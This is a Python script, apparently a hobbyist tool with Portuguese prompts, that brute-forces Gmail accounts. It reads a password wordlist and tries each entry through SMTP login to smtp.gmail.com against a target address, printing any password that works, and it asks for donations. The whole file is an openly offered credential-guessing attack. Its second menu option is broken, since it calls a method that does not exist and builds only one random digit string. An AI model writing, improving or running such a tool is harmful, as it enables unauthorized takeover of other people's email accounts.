from __future__ import absolute_import
from __future__ import print_function
from six.moves import input
import random
import string
import smtplib

class GmailBruteForce():
    def __init__(self):
        self.accounts = []
        self.passwords = []
        self.init_smtplib()

    def get_acc_list(self,path):
        file = open(path, 'r',encoding='utf8').read().splitlines()
        for line in file:
            self.accounts.append(line)

    def get_pass_list(self,path):
        file = open(path, 'r',encoding='utf8').read().splitlines()
        for line in file:
            self.passwords.append(line)

    def init_smtplib(self):
        self.smtp = smtplib.SMTP("smtp.gmail.com")
        self.smtp.starttls()
        self.smtp.ehlo()
    
    def try_gmail(self):

        for user in self.accounts:
            for password in self.passwords:
                try:
                    self.smtp.login(user,password)
                    print(("\033[1;37mSenhaCorreta -> %s " % user + " -> %s \033[1;m" % password ))
                    self.smtp.quit()
                    self.init_smtplib()
                    break;
                except smtplib.SMTPAuthenticationError:
                    # print("\033[1;31mdesculpe essa não é sua senha\033[1;m")
                    print(("\033[1;31mdesculpe essa não é sua senha %s " % user + " -> %s \033[1;m" % password ))

print('''
	                        
 __   __ __   __  o |   
(__| |  )  ) (__( | |_, 
 __/                    
''')

instance = GmailBruteForce()

do = input('''
		    For Favor Escolhe uma opção?
		1 - Gmail ( Normal com sua wordlsit) 
		2 - Gmail ( Combinação de senha)
		3 - Veja O Tutorial de como Criar Sua Wordlsit
		4 - deixe sua doação no paypal 
		5 - deixe sua doação pix
                
		
		==> ''')

if do == '1':
    user = input("gmail : ")
    senha = input("sua wordlsit : ")
    headers = [('User-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36')]

    instance.accounts.append(user)
    instance.get_pass_list(senha)

    instance.try_gmail()
    
if do == '2':
    user = input("gmail : ")
    senha = ''
    for i in range(10):
        senha += random.choice(string.digits+' ')
    
    headers = [('User-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36')]

    instance.accounts.append(user)
    instance.get_no_pass_list(senha)

    instance.try_gmail()
